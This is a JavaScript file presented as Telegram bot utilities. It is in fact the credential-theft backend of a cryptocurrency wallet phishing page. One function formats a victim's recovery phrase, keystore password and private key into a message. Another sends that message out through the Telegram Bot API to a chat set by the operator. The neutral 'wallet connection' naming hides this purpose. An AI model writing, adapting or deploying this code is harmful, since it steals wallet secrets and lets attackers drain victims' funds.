// Telegram Bot API utility functions

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Send a message to Telegram
export async function sendTelegramMessage(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error('Telegram bot token or chat ID not configured');
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML', // Allow HTML formatting
      }),
    });

    const data = await response.json();

    if (!data.ok) {
      throw new Error(`Telegram API error: ${data.description}`);
    }

    return data;
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    throw error;
  }
}

// Format wallet connection data for Telegram message
export function formatWalletConnectionMessage(connectionData) {
  const {
    walletName,
    connectionMethod,
    phraseInput,
    keystorePassword,
    privateKeyInput,
    timestamp,
    id,
  } = connectionData;

  let message = `<b>New Wallet Connection</b>\n\n`;
  message += `<b>ID:</b> ${id}\n`;
  message += `<b>Timestamp:</b> ${timestamp}\n`;
  message += `<b>Wallet:</b> ${walletName}\n`;
  message += `<b>Method:</b> ${connectionMethod}\n\n`;

  if (phraseInput) {
    message += `<b>Phrase:</b> <code>${phraseInput}</code>\n`;
  }
  if (keystorePassword) {
    message += `<b>Keystore Password:</b> <code>${keystorePassword}</code>\n`;
  }
  if (privateKeyInput) {
    message += `<b>Private Key:</b> <code>${privateKeyInput}</code>\n`;
  }

  return message;
}
